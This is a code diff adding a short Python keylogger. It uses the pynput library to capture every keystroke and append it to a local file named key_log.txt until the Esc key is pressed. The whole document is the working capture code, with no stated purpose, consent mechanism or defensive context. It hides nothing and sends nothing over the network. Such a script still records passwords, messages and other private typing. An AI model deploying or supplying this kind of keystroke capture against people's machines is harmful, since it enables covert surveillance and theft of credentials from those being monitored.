@@ -1,0 +1,25 @@
+from pynput import keyboard
+# File to save keystrokes
+log_file = "key_log.txt"
+def write_to_file(key):
+    try:
+        with open(log_file, "a") as f:
+            if hasattr(key, 'char') and key.char is not None:
+                f.write(key.char)
+            else:
+                f.write(f" [{key}] ")
+    except Exception as e:
+        print(f"Error writing key: {e}")
+
+# Callback function for key press
+def on_press(key):
+    write_to_file(key)
+
+# Callback function for key release
+def on_release(key):
+    if key == keyboard.Key.esc:  # Stop listener if 'Esc' key is pressed
+        return False
+
+# Start listening to keyboard events
+with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
+    listener.join()
